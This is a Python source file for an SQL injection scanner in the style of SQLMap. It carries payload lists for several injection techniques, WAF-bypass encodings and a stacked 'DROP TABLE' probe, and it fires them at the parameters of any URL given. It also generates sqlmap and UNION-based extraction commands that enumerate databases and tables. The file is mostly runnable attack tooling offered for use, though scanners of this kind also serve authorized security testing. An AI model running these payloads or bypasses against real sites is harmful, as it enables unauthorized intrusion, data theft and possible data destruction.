#!/usr/bin/env python3
"""
SQL Injection Scanner Module
Inspired by SQLMap's detection techniques
"""

import re
import time
import urllib.parse
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


class SQLiType(Enum):
    ERROR_BASED = "Error-based SQLi"
    UNION_BASED = "Union-based SQLi"
    BOOLEAN_BLIND = "Boolean-based Blind SQLi"
    TIME_BLIND = "Time-based Blind SQLi"
    STACKED_QUERIES = "Stacked Queries SQLi"
    OUT_OF_BAND = "Out-of-band SQLi"


class DBType(Enum):
    MYSQL = "MySQL"
    POSTGRESQL = "PostgreSQL"
    MSSQL = "Microsoft SQL Server"
    ORACLE = "Oracle"
    SQLITE = "SQLite"
    UNKNOWN = "Unknown"


@dataclass
class SQLiPayload:
    """SQL Injection Payload"""
    payload: str
    sqli_type: SQLiType
    db_types: List[DBType]
    description: str
    risk: int = 1  # 1-3, higher = more invasive


@dataclass
class SQLiVulnerability:
    """Detected SQL Injection vulnerability"""
    url: str
    parameter: str
    sqli_type: SQLiType
    db_type: DBType
    payload: str
    evidence: str
    confidence: int  # 1-100
    severity: str = "CRITICAL"
    poc_commands: List[str] = field(default_factory=list)


# SQL Error patterns by database type
SQL_ERROR_PATTERNS = {
    DBType.MYSQL: [
        r"SQL syntax.*?MySQL",
        r"Warning.*?\Wmysqli?_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB) server version",
        r"Unknown column '[^']+' in 'field list'",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"Syntax error or access violation",
        r"SQLSTATE\[HY000\]",
        r"MySQL server version for the right syntax",
    ],
    DBType.POSTGRESQL: [
        r"PostgreSQL.*?ERROR",
        r"Warning.*?\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"ERROR:\s+invalid input syntax",
        r"ERROR:\s+unterminated quoted string",
    ],
    DBType.MSSQL: [
        r"Driver.*? SQL[\-\_\ ]*Server",
        r"OLE DB.*? SQL Server",
        r"(\W|\A)SQL Server[^&lt;&quot;]+Driver",
        r"Warning.*?\W(mssql|sqlsrv)_",
        r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        r"(?s)Exception.*?\WSystem\.Data\.SqlClient\.",
        r"(?s)Exception.*?\WRoadhouse\.Cms\.",
        r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
        r"\[SQL Server\]",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
        r"macabordar\.telecom\.sqlserver",
        r"Unclosed quotation mark after the character string",
        r"'[^']*' is not a valid value for",
    ],
    DBType.ORACLE: [
        r"\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*?Driver",
        r"Warning.*?\W(oci|ora)_",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
        r"macabordar\.Telecom\.oracle",
        r"OracleException",
        r"oracle\.jdbc\.driver",
    ],
    DBType.SQLITE: [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"(Microsoft|System)\.Data\.SQLite\.SQLiteException",
        r"Warning.*?\W(sqlite_|SQLite3::)",
        r"\[SQLITE_ERROR\]",
        r"SQLite error \d+:",
        r"sqlite3.OperationalError:",
        r"SQLite3::SQLException",
        r"org\.sqlite\.JDBC",
        r"SQLiteException",
    ],
}

# SQL Injection payloads organized by type
SQLI_PAYLOADS = {
    SQLiType.ERROR_BASED: [
        SQLiPayload("'", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Single quote"),
        SQLiPayload("\"", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Double quote"),
        SQLiPayload("'--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Quote with comment"),
        SQLiPayload("'/*", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Quote with block comment"),
        SQLiPayload("' OR '1'='1", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Classic OR injection"),
        SQLiPayload("1' AND '1'='1", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "AND injection"),
        SQLiPayload("1 AND 1=1", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Numeric AND"),
        SQLiPayload("' UNION SELECT NULL--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "UNION probe"),
        SQLiPayload("1' ORDER BY 1--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "ORDER BY probe"),
        SQLiPayload("1' GROUP BY 1--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "GROUP BY probe"),
        SQLiPayload("1' HAVING 1=1--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "HAVING probe"),
        SQLiPayload("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", SQLiType.ERROR_BASED, [DBType.MYSQL], "MySQL EXTRACTVALUE error"),
        SQLiPayload("' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", SQLiType.ERROR_BASED, [DBType.MYSQL], "MySQL UPDATEXML error"),
        SQLiPayload("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", SQLiType.ERROR_BASED, [DBType.MYSQL], "MySQL double query error"),
        SQLiPayload("1' AND 1=CONVERT(int,(SELECT @@version))--", SQLiType.ERROR_BASED, [DBType.MSSQL], "MSSQL CONVERT error"),
        SQLiPayload("1';WAITFOR DELAY '0:0:0'--", SQLiType.ERROR_BASED, [DBType.MSSQL], "MSSQL stacked query probe"),
    ],
    SQLiType.BOOLEAN_BLIND: [
        SQLiPayload("1' AND 1=1--", SQLiType.BOOLEAN_BLIND, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "True condition"),
        SQLiPayload("1' AND 1=2--", SQLiType.BOOLEAN_BLIND, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "False condition"),
        SQLiPayload("1 AND 1=1", SQLiType.BOOLEAN_BLIND, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Numeric true"),
        SQLiPayload("1 AND 1=2", SQLiType.BOOLEAN_BLIND, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Numeric false"),
        SQLiPayload("1' AND 'a'='a", SQLiType.BOOLEAN_BLIND, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "String true"),
        SQLiPayload("1' AND 'a'='b", SQLiType.BOOLEAN_BLIND, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "String false"),
        SQLiPayload("1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", SQLiType.BOOLEAN_BLIND, [DBType.MYSQL, DBType.POSTGRESQL], "Schema probe"),
        SQLiPayload("1' AND (SELECT SUBSTRING(@@version,1,1))='5'--", SQLiType.BOOLEAN_BLIND, [DBType.MYSQL], "Version probe"),
    ],
    SQLiType.TIME_BLIND: [
        SQLiPayload("1' AND SLEEP(5)--", SQLiType.TIME_BLIND, [DBType.MYSQL], "MySQL SLEEP", 2),
        SQLiPayload("1' AND (SELECT SLEEP(5))--", SQLiType.TIME_BLIND, [DBType.MYSQL], "MySQL SELECT SLEEP", 2),
        SQLiPayload("1'; WAITFOR DELAY '0:0:5'--", SQLiType.TIME_BLIND, [DBType.MSSQL], "MSSQL WAITFOR", 2),
        SQLiPayload("1'; SELECT pg_sleep(5)--", SQLiType.TIME_BLIND, [DBType.POSTGRESQL], "PostgreSQL pg_sleep", 2),
        SQLiPayload("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", SQLiType.TIME_BLIND, [DBType.MYSQL], "MySQL nested SLEEP", 2),
        SQLiPayload("1' OR SLEEP(5)#", SQLiType.TIME_BLIND, [DBType.MYSQL], "MySQL OR SLEEP", 2),
        SQLiPayload("1'||pg_sleep(5)--", SQLiType.TIME_BLIND, [DBType.POSTGRESQL], "PostgreSQL concat sleep", 2),
        SQLiPayload("1' AND BENCHMARK(10000000,SHA1('test'))--", SQLiType.TIME_BLIND, [DBType.MYSQL], "MySQL BENCHMARK", 2),
    ],
    SQLiType.UNION_BASED: [
        SQLiPayload("' UNION SELECT NULL--", SQLiType.UNION_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "1 column"),
        SQLiPayload("' UNION SELECT NULL,NULL--", SQLiType.UNION_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "2 columns"),
        SQLiPayload("' UNION SELECT NULL,NULL,NULL--", SQLiType.UNION_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "3 columns"),
        SQLiPayload("' UNION SELECT NULL,NULL,NULL,NULL--", SQLiType.UNION_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "4 columns"),
        SQLiPayload("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", SQLiType.UNION_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "5 columns"),
        SQLiPayload("' UNION ALL SELECT NULL--", SQLiType.UNION_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "UNION ALL 1 column"),
        SQLiPayload("' UNION SELECT 1,2,3--", SQLiType.UNION_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.SQLITE], "Numeric union"),
        SQLiPayload("' UNION SELECT 'a','b','c'--", SQLiType.UNION_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.SQLITE], "String union"),
        SQLiPayload("-1' UNION SELECT 1,@@version,3--", SQLiType.UNION_BASED, [DBType.MYSQL, DBType.MSSQL], "Version extraction"),
        SQLiPayload("-1' UNION SELECT 1,version(),3--", SQLiType.UNION_BASED, [DBType.POSTGRESQL], "PostgreSQL version"),
    ],
    SQLiType.STACKED_QUERIES: [
        SQLiPayload("'; SELECT 1--", SQLiType.STACKED_QUERIES, [DBType.MSSQL, DBType.POSTGRESQL], "Basic stacked"),
        SQLiPayload("'; SELECT @@version--", SQLiType.STACKED_QUERIES, [DBType.MSSQL], "MSSQL version stacked"),
        SQLiPayload("'; SELECT version()--", SQLiType.STACKED_QUERIES, [DBType.POSTGRESQL], "PostgreSQL version stacked"),
        SQLiPayload("1; DROP TABLE test--", SQLiType.STACKED_QUERIES, [DBType.MSSQL, DBType.POSTGRESQL], "DROP probe (safe - nonexistent table)", 3),
    ],
}

# WAF bypass techniques
WAF_BYPASS_PAYLOADS = [
    # Case variations
    SQLiPayload("' Or '1'='1", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Case bypass"),
    SQLiPayload("' oR '1'='1", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Mixed case"),

    # Comment bypass
    SQLiPayload("'/**/OR/**/1=1--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL], "Comment spaces"),
    SQLiPayload("' /*!50000OR*/ 1=1--", SQLiType.ERROR_BASED, [DBType.MYSQL], "MySQL versioned comment"),

    # Encoding bypass
    SQLiPayload("%27%20OR%201=1--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "URL encoded"),
    SQLiPayload("' %4fR 1=1--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Partial URL encode"),

    # Unicode bypass
    SQLiPayload("' ＯＲ 1=1--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL], "Unicode fullwidth"),

    # Whitespace bypass
    SQLiPayload("'\t\nOR\t\n1=1--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Tab/newline"),
    SQLiPayload("' OR%0b1=1--", SQLiType.ERROR_BASED, [DBType.MYSQL], "Vertical tab"),

    # Double encoding
    SQLiPayload("%2527%2520OR%25201=1--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL, DBType.ORACLE, DBType.SQLITE], "Double URL encode"),

    # Null byte
    SQLiPayload("' OR 1=1%00--", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL], "Null byte terminator"),

    # HPP (HTTP Parameter Pollution)
    SQLiPayload("' OR '1'='1' /*", SQLiType.ERROR_BASED, [DBType.MYSQL, DBType.POSTGRESQL, DBType.MSSQL], "Block comment terminator"),
]


class SQLiScanner:
    """SQL Injection Scanner"""

    def __init__(self, timeout: int = 10, user_agent: str = None, proxy: str = None):
        self.timeout = timeout
        self.user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.session = self._create_session()
        self.vulnerabilities: List[SQLiVulnerability] = []
        self.baseline_responses: Dict[str, Tuple[int, int, float]] = {}  # param -> (status, length, time)
        self.time_threshold = 5  # seconds for time-based detection

    def _create_session(self) -> requests.Session:
        """Create HTTP session with retry logic"""
        session = requests.Session()
        retry = Retry(total=1, backoff_factor=0.3, status_forcelist=[502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update({"User-Agent": self.user_agent})
        return session

    def scan_url(self, url: str, method: str = "GET", data: Dict = None,
                 test_types: List[SQLiType] = None, max_risk: int = 2) -> List[SQLiVulnerability]:
        """Scan URL for SQL injection vulnerabilities"""
        self.vulnerabilities = []

        # Parse URL and extract parameters
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params and not data:
            params = self._discover_parameters(url)

        # Determine which injection types to test
        if test_types is None:
            test_types = [SQLiType.ERROR_BASED, SQLiType.BOOLEAN_BLIND, SQLiType.TIME_BLIND]

        # Get baseline responses
        self._get_baseline(url, params, method, data)

        # Test each parameter
        for param in params:
            for sqli_type in test_types:
                vuln = self._test_parameter(url, param, method, data, sqli_type, max_risk)
                if vuln:
                    self.vulnerabilities.append(vuln)
                    break  # Found vulnerability, move to next parameter

        # Test POST data parameters
        if data:
            for param in data:
                for sqli_type in test_types:
                    vuln = self._test_parameter(url, param, "POST", data, sqli_type, max_risk)
                    if vuln:
                        self.vulnerabilities.append(vuln)
                        break

        return self.vulnerabilities

    def _discover_parameters(self, url: str) -> Dict:
        """Discover parameters from page forms"""
        params = {}
        try:
            response = self.session.get(url, timeout=self.timeout, proxies=self.proxy, verify=False)
            content = response.text

            # Find form inputs
            input_pattern = r'<input[^>]*name=["\']?([^"\'>\s]+)["\']?[^>]*>'
            for match in re.finditer(input_pattern, content, re.IGNORECASE):
                params[match.group(1)] = ""

            # Find select fields
            select_pattern = r'<select[^>]*name=["\']?([^"\'>\s]+)["\']?[^>]*>'
            for match in re.finditer(select_pattern, content, re.IGNORECASE):
                params[match.group(1)] = ""

        except Exception:
            pass

        return params

    def _get_baseline(self, url: str, params: Dict, method: str, data: Dict):
        """Get baseline response for comparison"""
        try:
            start = time.time()
            if method.upper() == "GET":
                response = self.session.get(url, timeout=self.timeout, proxies=self.proxy, verify=False)
            else:
                response = self.session.post(url, data=data or {}, timeout=self.timeout, proxies=self.proxy, verify=False)
            elapsed = time.time() - start

            self.baseline_responses["_default_"] = (response.status_code, len(response.text), elapsed)

            # Get baseline for each parameter
            for param in params:
                self.baseline_responses[param] = (response.status_code, len(response.text), elapsed)

        except Exception:
            self.baseline_responses["_default_"] = (200, 0, 1.0)

    def _test_parameter(self, url: str, param: str, method: str, data: Dict,
                        sqli_type: SQLiType, max_risk: int) -> Optional[SQLiVulnerability]:
        """Test a parameter for SQL injection"""
        payloads = [p for p in SQLI_PAYLOADS.get(sqli_type, []) if p.risk <= max_risk]

        for payload_obj in payloads:
            result = self._inject_and_analyze(url, param, payload_obj, method, data, sqli_type)
            if result:
                return result

        # Try WAF bypass if no vulnerability found with standard payloads
        for payload_obj in WAF_BYPASS_PAYLOADS:
            if payload_obj.risk <= max_risk:
                result = self._inject_and_analyze(url, param, payload_obj, method, data, SQLiType.ERROR_BASED)
                if result:
                    return result

        return None

    def _inject_and_analyze(self, url: str, param: str, payload_obj: SQLiPayload,
                           method: str, data: Dict, sqli_type: SQLiType) -> Optional[SQLiVulnerability]:
        """Inject payload and analyze response"""
        try:
            start_time = time.time()

            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                original_value = params.get(param, [""])[0]
                params[param] = [original_value + payload_obj.payload]
                query = urllib.parse.urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                response = self.session.get(test_url, timeout=self.timeout + 10, proxies=self.proxy, verify=False)
            else:
                test_data = (data or {}).copy()
                original_value = test_data.get(param, "")
                test_data[param] = original_value + payload_obj.payload
                response = self.session.post(url, data=test_data, timeout=self.timeout + 10, proxies=self.proxy, verify=False)

            elapsed = time.time() - start_time
            content = response.text

            # Check for error-based SQLi
            if sqli_type == SQLiType.ERROR_BASED or sqli_type == SQLiType.UNION_BASED:
                db_type, error_msg = self._detect_sql_error(content)
                if db_type != DBType.UNKNOWN:
                    return SQLiVulnerability(
                        url=url,
                        parameter=param,
                        sqli_type=sqli_type,
                        db_type=db_type,
                        payload=payload_obj.payload,
                        evidence=f"SQL error detected: {error_msg[:100]}",
                        confidence=90,
                        poc_commands=self._generate_poc_commands(url, param, payload_obj.payload, db_type)
                    )

            # Check for time-based SQLi
            if sqli_type == SQLiType.TIME_BLIND:
                baseline_time = self.baseline_responses.get(param, self.baseline_responses.get("_default_", (200, 0, 1.0)))[2]
                if elapsed > baseline_time + self.time_threshold:
                    # Verify with additional test
                    if self._verify_time_based(url, param, method, data, payload_obj):
                        return SQLiVulnerability(
                            url=url,
                            parameter=param,
                            sqli_type=SQLiType.TIME_BLIND,
                            db_type=payload_obj.db_types[0] if payload_obj.db_types else DBType.UNKNOWN,
                            payload=payload_obj.payload,
                            evidence=f"Response time: {elapsed:.2f}s (baseline: {baseline_time:.2f}s)",
                            confidence=85,
                            poc_commands=self._generate_poc_commands(url, param, payload_obj.payload, payload_obj.db_types[0] if payload_obj.db_types else DBType.UNKNOWN)
                        )

            # Check for boolean-based SQLi
            if sqli_type == SQLiType.BOOLEAN_BLIND:
                if self._check_boolean_blind(url, param, method, data):
                    return SQLiVulnerability(
                        url=url,
                        parameter=param,
                        sqli_type=SQLiType.BOOLEAN_BLIND,
                        db_type=DBType.UNKNOWN,
                        payload=payload_obj.payload,
                        evidence="Different responses for TRUE/FALSE conditions",
                        confidence=75,
                        poc_commands=self._generate_poc_commands(url, param, payload_obj.payload, DBType.UNKNOWN)
                    )

            return None

        except requests.exceptions.Timeout:
            # Timeout might indicate time-based SQLi
            if sqli_type == SQLiType.TIME_BLIND:
                return SQLiVulnerability(
                    url=url,
                    parameter=param,
                    sqli_type=SQLiType.TIME_BLIND,
                    db_type=payload_obj.db_types[0] if payload_obj.db_types else DBType.UNKNOWN,
                    payload=payload_obj.payload,
                    evidence="Request timed out (potential time-based SQLi)",
                    confidence=70,
                    poc_commands=self._generate_poc_commands(url, param, payload_obj.payload, payload_obj.db_types[0] if payload_obj.db_types else DBType.UNKNOWN)
                )
            return None

        except Exception:
            return None

    def _detect_sql_error(self, content: str) -> Tuple[DBType, str]:
        """Detect SQL error in response content"""
        for db_type, patterns in SQL_ERROR_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    return db_type, match.group(0)
        return DBType.UNKNOWN, ""

    def _verify_time_based(self, url: str, param: str, method: str, data: Dict,
                          payload_obj: SQLiPayload) -> bool:
        """Verify time-based SQLi with additional test"""
        try:
            # Test with shorter delay
            short_payload = payload_obj.payload.replace("5", "2").replace("0:0:5", "0:0:2")

            start_time = time.time()
            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                params[param] = [params.get(param, [""])[0] + short_payload]
                query = urllib.parse.urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                self.session.get(test_url, timeout=self.timeout + 5, proxies=self.proxy, verify=False)
            else:
                test_data = (data or {}).copy()
                test_data[param] = test_data.get(param, "") + short_payload
                self.session.post(url, data=test_data, timeout=self.timeout + 5, proxies=self.proxy, verify=False)

            elapsed = time.time() - start_time
            baseline_time = self.baseline_responses.get(param, self.baseline_responses.get("_default_", (200, 0, 1.0)))[2]

            # Shorter delay should result in shorter response time
            return elapsed > baseline_time + 1.5

        except requests.exceptions.Timeout:
            return True
        except Exception:
            return False

    def _check_boolean_blind(self, url: str, param: str, method: str, data: Dict) -> bool:
        """Check for boolean-based blind SQLi"""
        try:
            # True condition
            true_payload = "' AND '1'='1"
            false_payload = "' AND '1'='2"

            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)

                # True condition
                params_true = params.copy()
                params_true[param] = [params.get(param, [""])[0] + true_payload]
                query_true = urllib.parse.urlencode(params_true, doseq=True)
                url_true = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_true}"
                resp_true = self.session.get(url_true, timeout=self.timeout, proxies=self.proxy, verify=False)

                # False condition
                params_false = params.copy()
                params_false[param] = [params.get(param, [""])[0] + false_payload]
                query_false = urllib.parse.urlencode(params_false, doseq=True)
                url_false = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_false}"
                resp_false = self.session.get(url_false, timeout=self.timeout, proxies=self.proxy, verify=False)

            else:
                test_data_true = (data or {}).copy()
                test_data_true[param] = test_data_true.get(param, "") + true_payload
                resp_true = self.session.post(url, data=test_data_true, timeout=self.timeout, proxies=self.proxy, verify=False)

                test_data_false = (data or {}).copy()
                test_data_false[param] = test_data_false.get(param, "") + false_payload
                resp_false = self.session.post(url, data=test_data_false, timeout=self.timeout, proxies=self.proxy, verify=False)

            # Compare responses
            baseline = self.baseline_responses.get("_default_", (200, 0, 1.0))

            # Check if responses are significantly different
            len_diff = abs(len(resp_true.text) - len(resp_false.text))
            if len_diff > 100:  # More than 100 chars difference
                return True

            # Check status code difference
            if resp_true.status_code != resp_false.status_code:
                return True

            return False

        except Exception:
            return False

    def _generate_poc_commands(self, url: str, param: str, payload: str, db_type: DBType) -> List[str]:
        """Generate PoC commands for the vulnerability"""
        commands = []
        parsed = urllib.parse.urlparse(url)

        # Basic curl command
        safe_payload = urllib.parse.quote(payload, safe='')
        commands.append(f"# Test SQL injection with curl:")
        commands.append(f"curl -s '{url}&{param}={safe_payload}'")
        commands.append("")

        # SQLMap command
        commands.append(f"# Automated exploitation with sqlmap:")
        commands.append(f"sqlmap -u '{url}' -p {param} --batch --dbs")
        commands.append("")

        # Database-specific commands
        if db_type == DBType.MYSQL:
            commands.append("# MySQL specific extraction:")
            commands.append(f"# Version: ' UNION SELECT @@version--")
            commands.append(f"# Databases: ' UNION SELECT schema_name FROM information_schema.schemata--")
            commands.append(f"# Tables: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--")
        elif db_type == DBType.POSTGRESQL:
            commands.append("# PostgreSQL specific extraction:")
            commands.append(f"# Version: ' UNION SELECT version()--")
            commands.append(f"# Databases: ' UNION SELECT datname FROM pg_database--")
            commands.append(f"# Tables: ' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--")
        elif db_type == DBType.MSSQL:
            commands.append("# MSSQL specific extraction:")
            commands.append(f"# Version: ' UNION SELECT @@version--")
            commands.append(f"# Databases: ' UNION SELECT name FROM master..sysdatabases--")
            commands.append(f"# Tables: ' UNION SELECT name FROM sysobjects WHERE xtype='U'--")

        return commands

    def generate_report(self) -> str:
        """Generate SQL injection scan report"""
        if not self.vulnerabilities:
            return "No SQL injection vulnerabilities found."

        report = []
        report.append("=" * 60)
        report.append("SQL INJECTION VULNERABILITY SCAN REPORT")
        report.append("=" * 60)
        report.append(f"\nTotal vulnerabilities found: {len(self.vulnerabilities)}\n")

        for i, vuln in enumerate(self.vulnerabilities, 1):
            report.append(f"\n[{i}] {vuln.sqli_type.value}")
            report.append("-" * 40)
            report.append(f"URL: {vuln.url}")
            report.append(f"Parameter: {vuln.parameter}")
            report.append(f"Database Type: {vuln.db_type.value}")
            report.append(f"Confidence: {vuln.confidence}%")
            report.append(f"Severity: {vuln.severity}")
            report.append(f"Payload: {vuln.payload}")
            report.append(f"Evidence: {vuln.evidence}")

            if vuln.poc_commands:
                report.append("\nPoC Commands:")
                for cmd in vuln.poc_commands:
                    report.append(f"  {cmd}")

        return "\n".join(report)


def quick_sqli_scan(url: str) -> List[SQLiVulnerability]:
    """Quick SQL injection scan of a URL"""
    scanner = SQLiScanner()
    return scanner.scan_url(url)


def generate_sqli_payloads(db_type: str = "all") -> List[str]:
    """Generate SQL injection payloads for testing"""
    payloads = []

    for sqli_type, payload_list in SQLI_PAYLOADS.items():
        for p in payload_list:
            if db_type == "all" or any(db_type.lower() in db.value.lower() for db in p.db_types):
                payloads.append(p.payload)

    return payloads


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python sqli_scanner.py <url>")
        print("Example: python sqli_scanner.py 'http://example.com/page?id=1'")
        sys.exit(1)

    target_url = sys.argv[1]
    print(f"Scanning {target_url} for SQL injection vulnerabilities...")

    scanner = SQLiScanner()
    vulns = scanner.scan_url(target_url)

    print(scanner.generate_report())
